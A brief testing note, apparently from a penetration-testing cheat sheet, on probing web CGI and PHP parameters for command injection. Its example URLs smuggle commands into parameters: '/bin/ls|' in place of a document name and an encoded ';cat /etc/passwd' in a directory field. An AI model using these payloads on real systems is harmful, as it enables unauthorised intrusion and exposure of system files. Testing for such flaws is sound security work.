# How to test for command injction
```bash
from : http://sensitive/cgi-bin/userData.pl?doc=user1.txt
to : http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
to : http://sensitive/something.php?dir=%3Bcat%20/etc/passwd
```
